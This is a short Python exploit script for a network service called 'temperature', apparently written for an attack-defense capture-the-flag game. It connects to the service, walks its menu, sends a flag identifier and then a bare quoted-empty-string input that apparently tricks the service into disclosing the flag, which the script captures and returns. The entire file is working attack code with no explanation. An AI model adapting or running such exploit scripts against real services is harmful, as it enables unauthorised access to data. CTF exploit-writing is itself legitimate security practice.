import socket

# exploit for 'temperature'
class Exploit():

	def __init__(self):
		self.flag = ""
	
	def execute(self, ip, port, flag_id):
		s = socket.create_connection((ip, port))
		data = s.recv(1024);
		s.send("1\n")
		s.recv(1024)
		s.send(flag_id + "\n")
		s.recv(1024)
		s.send("\"\"\n")
		flg = s.recv(1024)

		self.flag = flg.strip('\n')

	def result(self):
		return {'FLAG': self.flag}	
